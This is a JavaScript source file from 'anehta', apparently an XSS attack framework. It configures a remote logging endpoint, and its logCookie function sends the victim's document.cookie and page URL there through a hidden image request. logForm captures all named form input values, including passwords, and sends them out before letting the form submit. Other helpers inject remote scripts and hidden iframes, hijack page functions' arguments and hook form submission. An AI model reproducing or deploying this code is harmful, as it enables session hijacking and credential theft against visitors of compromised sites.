//alert("base.js");
// Author: axis
//////////////////////////////////////////////////
//// 定义常量
//////////////////////////////////////////////////
var anehta = {
        version: '0.3.0',
        author: 'axis',
        contact: 'axis@ph4nt0m.org',
        homepage: 'http://www.ph4nt0m.org',
        blog: 'http://hi.baidu.com/aullik5',
        projecthome: 'http://anehta.googlecode.com'};


var isBaseLibLoaded = "true";
var anehtaurl = "http://www.secwiki.com/anehta";
var feedurl = anehtaurl+"/feed.js";
var logurl = anehtaurl+"/logxss.php?";  // cookie 和 querystring 收集
var XssGotURI = "    [**** Request URI: "+escape(window.location.href)+" ****]\r\n";
var XssGotCookie = "    [**** Cookie: "+escape(document.cookie)+" ****]\r\n";
var XssGotFormSniffer_S = "    [**** Form Sniffer: ";
var XssGotFormSniffer_E = " ****]\r\n";

var $d=document;

//////////////////////////////////////////////////
//// Core Library
//////////////////////////////////////////////////
anehta.core = {};



//////////////////////////////////////////////////
//// Net Library
//////////////////////////////////////////////////
anehta.net = {};

// 提交表单  
anehta.net.postForm = function(url){
        var f;
	f=document.createElement('form');	
	f.action=url;
	f.method="post";
	//f.method="get";
	document.getElementsByTagName("body")[0].appendChild(f);
	f.submit();
}


// img get 请求
anehta.net.getURL = function(s){
	var image = new Image();
	image.style.width = 0;
	image.style.height = 0;
	image.src = s;
}

//////////////////////////////////////////////////
//// Injection Library
//////////////////////////////////////////////////
anehta.inject = {};

anehta.inject.InjectScript = function(ptr_sc){
    s=document.createElement("script");
    s.src=ptr_sc;
    document.getElementsByTagName("body")[0].appendChild(s);
}


anehta.inject.AddScript = function(ptr_sc){
    document.write("<script src='"+ptr_sc+"'></script>");
}

anehta.inject.createIframe = function(w) {
	var d = w.document;
	var newIframe = d.createElement("iframe");
	newIframe.style.width = 0;
	newIframe.style.height = 0;
	d.body.appendChild(newIframe);
	newIframe.contentWindow.document.write("<html><body></body></html>");
	return newIframe;
}

anehta.inject.injectScriptIntoIframe = function(f, proc) {
	var d = f.contentWindow.document;
	var s = "<script>\n(" + proc.toString() + ")();\n</script>";
	d.write(s);
}

anehta.inject.injectIframe = function(remoteurl) {
	var newIframe = $d.createElement("iframe");
	newIframe.style.width = 0;
	newIframe.style.height = 0;
	newIframe.src = remoteurl;
	$d.body.appendChild(newIframe);
	return newIframe;	
}


//////////////////////////////////////////////////
//// Logger Library
//////////////////////////////////////////////////
anehta.logger = {};

anehta.logger.logCookie = function(){
	var param = XssGotURI+XssGotCookie;  // 传递回server的参数
  //param = base64encode(param); // base64 加密参数传输
  //alert(param);
  // 发送cookie 和 uri 回 server
  anehta.net.getURL(logurl+param);
}

/*
* Name: logForm
* Args:
*       o - specified form object
*       url - the url you want to get with form information
*       delay - time span you want to delay
* e.g.
*       <form onsubmit="return logForm(this, 'http://www.target.com', 500);" method="post" ...>
*/
anehta.logger.logForm = function(o, url, delay) {
	//alert("logForm");
	var inputs = o.getElementsByTagName("input");
	//url += "?";
	var param = ""; // form的参数

	for (var i = 0; i < inputs.length; i ++) {
		if (inputs[i].getAttribute("name") != null && 
			inputs[i].getAttribute("name") != "") {
			param += escape(inputs[i].getAttribute("name")) + "=" + escape(inputs[i].value) + "&";
		}
	}
	
	// 记录提交的参数到远程服务器
	param = XssGotFormSniffer_S + escape(param) + XssGotFormSniffer_E;
	//getURL(url+param);
	var img = document.createElement("IMG");
	document.body.appendChild(img);
	img.width = 0;
	img.height = 0;
	img.src = url+param;

  // 让提交延时,保证logForm成功
	setTimeout(function(){
			if (o._submit != undefined) {
				o._submit();
			} else {
				o.submit();
			}
		}, delay);

	return false;
} 


//////////////////////////////////////////////////
//// Hook Library
//////////////////////////////////////////////////
/* 一般JS函数的hook, 使用委托
   @axis
   注意hook函数加载前,如果函数已经调用了,则该函数无法hook 
   var hj = new hookJsFunction();
   
   //自己定义的函数需要返回一个array作为被hook函数的新参数
   //可以劫持参数,不能递归调用
   hj.hook("被hook的函数名", "保存原函数的变量", "你的函数名");
   
   hi.unhook("被hook的函数名", "保存原函数的变量");
   
   //可以递归注入函数,不能劫持参数
   hj.injectFn("被inject的函数名", "保存原函数的变量", "你的函数名");
*/
anehta.hooklib = {};

anehta.hooklib.hookFn = function (){
	//alert("hookjsfunc");
  // 保存原函数;还是需要作为参数指定一个,
  //否则多次hook后会丢失之前保存的原函数
	//var RealFuncAfterHooked;  

  return {
	  hook: function(funcNameHooked, RealFuncAfterHooked, hookFunc){
	  	try {
	  	  setTimeout(function(){ 
	  		  //alert("hook before: "+window[funcNameHooked]);
	  		  // 保存原函数
	  		  window[RealFuncAfterHooked] = window[funcNameHooked];
	  		  //window[funcNameHooked] = window[hookFunc];
	  		  // 参数个数可以根据需要进行调整
	  		  window[funcNameHooked] = function (param1,param2,param3,param4,param5,param6,param7){
	  		  	// 劫持参数
	  		  	var newParam = new Array();

	  			  // 先执行注入的函数; 需要返回被劫持后的参数,作为新参数传入原函数
	  			  newParam = window[hookFunc](param1, param2, param3, param4, param5, param6, param7); 
	  			  //alert("newParam= "+newParam);
	  			  // 再执行原函数
	  			  window[RealFuncAfterHooked](newParam[0], newParam[1], newParam[2], newParam[3], 
	  			                              newParam[4], newParam[5], newParam[6]); 
	  			                              
	  			  // 不注入参数,直接执行原函数;                            
	  			  //window[RealFuncAfterHooked](param1,param2,param3,param4,param5,param6,param7);  
	  			  }
	  		  //alert("hook after: "+window[funcNameHooked]);
	  		  }, 
		      10);
		    return true;
		  } catch (e){
			  return false;
		  }
	  },
	  
	  unhook: function(funcNameHooked, RealFuncAfterHooked){
	  	try {
	  	  setTimeout(function(){ 
	  		  //alert("unhook before: "+window[funcNameHooked]);
	  		  window[funcNameHooked] = function (param1,param2,param3,param4,param5,param6,param7){
	  			  window[RealFuncAfterHooked](param1,param2,param3,param4,param5,param6,param7);  // 执行原函数;
	  		  }
	  		  //alert("unhook after: "+window[funcNameHooked]);
	  		  }, 
		      10);
		    return true;
		  
		 } catch (e){
		 	  return false;
		 }
	  },
	  
	  injectFn: function(funcNameInjected, RealFuncAfterInjected, injectFunc){
	  	try {
	  	  setTimeout(function(){ 
	  		  // 保存原函数
	  		  window[RealFuncAfterInjected] = window[funcNameInjected];
	  		  // 参数个数可以根据需要进行调整
	  		  window[funcNameInjected] = function (param1,param2,param3,param4,param5,param6,param7){
	  			  // 先执行注入的函数
	  			  window[injectFunc](param1, param2, param3, param4, param5, param6, param7); 
	  			  // 再执行原函数
	  			  window[RealFuncAfterInjected](param1,param2,param3,param4,param5,param6,param7);  
	  			  }
	  		  }, 
		      10);
		    return true;
		  } catch (e){
			  return false;
		  }
	  }	  
	};	
};


/*
* Name: hookSubmit 
* Args:
*       o - specified form object
* e.g.
*       <form onkeydown="javascript: hookSubmit(this);" ..>
*
* If the form uses javascript to call submit method for submitting, you should install a hook on the form.
*/
anehta.hooklib.hookSubmit = function(o, injectFuncCallBack) {
	if (o.hooked == undefined) {
		o.hooked = true;
		o._submit = o.submit;

		o.submit = function() {
			//alert("submit hooked!");
			// hook函数的功能作为第二个参数在这里调用
			injectFuncCallBack();					
			o.onsubmit();
		}
	}
}

//////////////////////////////////////////////////
//// Detect Library
//////////////////////////////////////////////////



//////////////////////////////////////////////////
// Ajax Library 
//////////////////////////////////////////////////
anehta.ajax = {};
/*
* XmlHttp 类
*/
anehta.ajax.XmlHttp = function() {
	var o = null;
	
	var readyStateChange = function(processResponseProc) {
		if (o.readyState == 4) {
			//if (o.status == 200 || o.status == 0) {
			// 使得永远返回真.看回显
			if (o.status) {
				processResponseProc(o.responseText, o.getAllResponseHeaders());
			} /*else if (o.status == 302 || o.status == 301 || o.status == 304) { 
				processResponseProc(null, o.getAllResponseHeaders());
			} else {
				processResponseProc(null, null);
			}*/
		}
	};

	var setRequestHeaders = function(headers) {
		var header, name, value;

		if (headers == null || headers == undefined) {
			return;
		}

		for (var i = 0; i < headers.length; i ++) {
			header = headers[i];
			if (header.indexOf(":") < 0) {
				continue;
			}
			name = header.split(":")[0];
			value = header.substring(header.indexOf(":") + 1);
			o.setRequestHeader(name, value);
		}
	}

	return {
		/*
		* init 方法
		*
		* 返回值
		* 如果初始化成功则返回true，否则返回false
		*
		* 说明
		* 初始化XmlHttp对象，
		*/
		init : function() {
			if (o == null) {
				if (window.XMLHttpRequest) {
					try {
						o = new XMLHttpRequest();
					} catch (ex) {
						return false;
					}
				} else if (window.ActiveXObject) {
					try {
						o = new ActiveXObject("Msxml4.XMLHttp");
					} catch (ex) {
						try {
							o = new ActiveXObject("Msxml2.XMLHttp");
						} catch (ex) {
							try {
								o = new ActiveXObject("Microsoft.XMLHttp");
							} catch (ex) {
								return false;
							}
						}
					}
				}
			}

			return true;
		},

		/*
		* get 方法
		*
		* 参数
		* url - 要请求的url
		* processResponse - 处理返回结果委托
		*
		* 返回值
		* 如果请求发起成功则返回true,否则返回false
		*
		* 说明
		* 发起http请求
		*/
		get : function(url, headers, processResponse) {
			try {
				o.open("GET", url, true);
				setRequestHeaders(headers);
				o.onreadystatechange = function() { readyStateChange(processResponse); };
				o.send();
				return true;
			} catch (ex) {
				return false;
			}
		},

		/*
		* post 方法
		*
		* 参数
		* url - 要请求的url
		* data - 发送的数据，注意这里值必须是urlencode过的
		* processResponse - 处理返回结果委托
		*
		* 返回值
		* 如果请求发起成功则返回true,否则返回false
		*
		* 说明
		* 发起post请求
		*/
		post : function(url, data, headers, processResponse) {
			processResponseProc = processResponse;
			try {
				o.open("POST", url, true);
				setRequestHeaders(headers);
				o.onreadystatechange = function() { readyStateChange(processResponse); };
				o.setRequestHeader("Content-Length", data.length);
				o.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
				o.send(data);
				return true;
			} catch (ex) {
				return false;
			}
		}
	};
};

/*  使用方法
var xmlhttp = new anehta.ajax.XmlHttp();
if (xmlhttp.init()) {
	var url = "http://cn.yahoo.com";

	xmlhttp.post(url, "", null, function(response, responseHeaders) {
		if (responseHeaders != null) {
			alert(responseHeaders);
		}

		if (response != null) {
			alert(response);
		}
	});
}
*/

// 初始化
var xmlhttp = new anehta.ajax.XmlHttp();

///////////////////////////////////////////////
//// 重新封装POST/GET
///////////////////////////////////////////////
anehta.ajax.post = function(url, param){ 
  // 第二个参数是提交的参数,第三个参数是headers
	xmlhttp.post(url, param, null, function(response, responseHeaders) {
		 if (responseHeaders != null) {
			 //alert(responseHeaders);
		 }
    
		 if (response != null) {
			 //alert(response);
		 }		    
	 });
}
 
anehta.ajax.get = function(url){
  // 第二个参数是headers
	xmlhttp.get(url, null, function(response, responseHeaders) {
		if (responseHeaders != null) {
			//alert(responseHeaders);
		}
    
		if (response != null) {
			//alert(response);
		}
	});
} 



//////////////////////////////////////////////////
// base64 编码和解码函数 
//////////////////////////////////////////////////

